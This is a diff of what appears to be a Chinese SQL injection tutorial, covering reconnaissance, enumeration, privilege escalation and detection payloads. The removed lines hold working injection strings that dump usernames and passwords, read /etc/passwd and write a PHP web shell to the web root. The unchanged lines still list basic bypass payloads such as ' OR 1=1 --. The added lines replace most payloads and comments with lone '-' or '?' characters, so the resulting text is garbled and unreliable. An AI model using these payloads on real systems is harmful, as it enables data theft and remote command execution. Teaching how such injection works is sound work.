@@ -143,43 +143,43 @@ SQL 注入成功的关键要素：
 攻击者首先需要收集目标系统的信息：
 
 ```sql
- True-- 测试注入点
- True?id=1'
- True?id=1"
- True?id=1 AND 1=1
- True?id=1 AND 1=2
- True-- 获取数据库版本
- True?id=1' AND 1=CONVERT(int, (SELECT TOP 1 @@version)) --
- True-- 获取当前数据库名
- True?id=1' AND 1=CONVERT(int, (SELECT TOP 1 database_name FROM information_schema.tables)) --
- True-- 获取用户名
- True?id=1' AND 1=CONVERT(int, (SELECT TOP 1 user_name())) --
+ -
+ ?
+ ?
+ ?
+ ?
+ -
+ ?
+ -
+ ?
+ -
+ ?
 ```
 
 #### 2.3.2 数据库枚举阶段
 
 ```sql
- True-- MySQL 获取所有数据库
- True?id=1' UNION SELECT 1, schema_name FROM information_schema.schemata --
- True-- 获取当前数据库的所有表
- True?id=1' UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema=database() --
- True-- 获取表的的所有列
- True?id=1' UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='users' --
- True-- 获取数据
- True?id=1' UNION SELECT username, password FROM users --
+ -
+ ?
+ -
+ ?
+ -
+ ?
+ -
+ ?
 ```
 
 #### 2.3.3 权限提升阶段
 
 ```sql
- True-- 检查是否为 DBA（数据库管理员）
- True?id=1' AND 1=(SELECT COUNT(*) FROM mysql.user WHERE Super_priv='Y') --
- True-- 获取 MySQL 用户列表
- True?id=1' UNION SELECT 1, user FROM mysql.user --
- True-- 读取文件（需要 FILE 权限）
- True?id=1' UNION SELECT 1, LOAD_FILE('/etc/passwd') --
- True-- 写入文件
- True?id=1' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php' --
+ -
+ ?
+ -
+ ?
+ -
+ ?
+ -
+ ?
 ```
 
 ## 3. SQL 注入检测方法 (Detection Methods)
@@ -189,7 +189,7 @@ SQL 注入成功的关键要素：
 #### 3.1.1 基础测试 Payload
 
 ```sql
- True-- 单引号测试
+ -
  '
  "
  ' OR '1'='1
@@ -198,30 +198,30 @@ SQL 注入成功的关键要素：
  " OR 1=1 --
  ' OR 'a'='a
  " OR "a"="a
- True-- 注释测试
+ -
  ' --
  " --
  ' #
  " #
  /* */
- True-- OR 测试
+ -
  ' OR 1=1 --
  ' OR '1'='1
  1' OR '1'='1
- True-- AND 测试
+ -
  ' AND 1=1 --
  ' AND 1=2 --
  1' AND 1=1 --
  1' AND 1=2 --
- True-- 数字型测试
+ -
  1 AND 1=1
  1 AND 1=2
- True-- LIKE 测试
+ -
  ' LIKE '%
- True%' OR 1=1 --
- True-- IN 测试
+ %
+ -
  ' IN ('a', 'b') --
- True-- UNION 测试
+ -
  ' UNION SELECT NULL --
  ' UNION SELECT 1,2 --
  ' UNION SELECT NULL, NULL --
